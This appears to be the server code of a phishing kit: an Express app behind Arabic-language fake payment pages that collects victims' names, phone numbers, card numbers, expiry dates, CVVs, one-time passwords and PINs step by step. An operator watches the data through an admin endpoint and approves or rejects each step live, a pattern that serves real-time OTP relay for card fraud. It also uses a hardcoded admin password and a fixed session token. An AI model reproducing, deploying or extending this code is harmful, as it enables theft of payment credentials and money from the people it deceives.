const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Custom routing for payment pages to bypass cache
app.get('/payment_ar.html', (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.sendFile(path.join(__dirname, 'payment_new_ar.html'));
});

app.use(express.static(path.join(__dirname, './')));

let orders = [];
const ADMIN_PASSWORD = 'Fazaa12345@@';

// API Routes
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, token: 'authenticated_session_token' });
    } else {
        res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
    }
});

// Save data and set status to 'waiting_payment'
app.post('/submit-data', (req, res) => {
    const data = req.body;
    const orderId = Date.now().toString();
    const order = {
        id: orderId,
        timestamp: new Date().toLocaleString('ar-AE'),
        status: 'waiting_payment',
        name: data.name || 'غير معروف',
        phone: data.phone || '',
        transactionId: data.transactionId || '',
        cardName: data.cardName || '',
        cardNumber: data.cardNumber || '',
        expiryDate: data.expiryDate || '',
        cvv: data.cvv || '',
        otp: '',
        pin: '',
        lastError: ''
    };
    orders.push(order);
    res.json({ success: true, orderId: orderId });
});

// Update OTP
app.post('/submit-otp', (req, res) => {
    const { orderId, otp } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.otp = otp;
        order.status = 'waiting_otp';
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// Update PIN
app.post('/submit-pin', (req, res) => {
    const { orderId, pin } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.pin = pin;
        order.status = 'waiting_pin';
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// Polling endpoint for client to check status
app.get('/api/check-status/:orderId', (req, res) => {
    const order = orders.find(o => o.id === req.params.orderId);
    if (order) {
        res.json({ status: order.status, lastError: order.lastError });
    } else {
        res.status(404).json({ success: false });
    }
});

// Admin endpoint to update status (Approve/Reject)
app.post('/api/update-order-status', (req, res) => {
    const authHeader = req.headers.authorization;
    if (authHeader !== 'authenticated_session_token') {
        return res.status(403).json({ success: false });
    }
    const { orderId, status, error } = req.body;
    const order = orders.find(o => o.id === orderId);
    if (order) {
        order.status = status;
        if (error) order.lastError = error;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.get('/api/get-data', (req, res) => {
    const authHeader = req.headers.authorization;
    if (authHeader === 'authenticated_session_token') {
        res.json(orders);
    } else {
        res.status(403).json({ success: false });
    }
});

app.get('/:page.html', (req, res) => {
    res.sendFile(path.join(__dirname, req.params.page + '.html'), (err) => {
        if (err) res.status(404).send('Page not found');
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index_ar.html'));
});

app.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});
